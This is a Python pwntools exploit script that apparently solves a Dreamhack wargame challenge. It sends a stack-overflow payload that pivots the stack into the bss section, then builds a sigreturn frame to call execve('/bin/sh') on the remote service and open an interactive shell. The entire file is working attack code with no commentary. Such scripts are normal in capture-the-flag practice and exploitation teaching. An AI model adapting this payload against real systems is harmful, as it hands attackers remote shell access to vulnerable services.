from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 23086
r=remote(HOST, PORT)

bss=0x404000
leave=0x401172
ret=0x40101a
syscall=0x401136

payload=b'A'*0x10+p64(bss+0x500)+p64(0x401145)

r.send(payload)
time.sleep(0.08)

r.send(payload)
time.sleep(0.08)

payload=flat([
    b'A'*0x10,
    bss+0x300,
    syscall,
])

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = bss+0x500-0x10
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload+=bytes(frame)

r.send(payload)
time.sleep(0.08)

payload=b'/bin/sh\x00'.ljust(0xf, b'\x00')
r.send(payload)

r.interactive()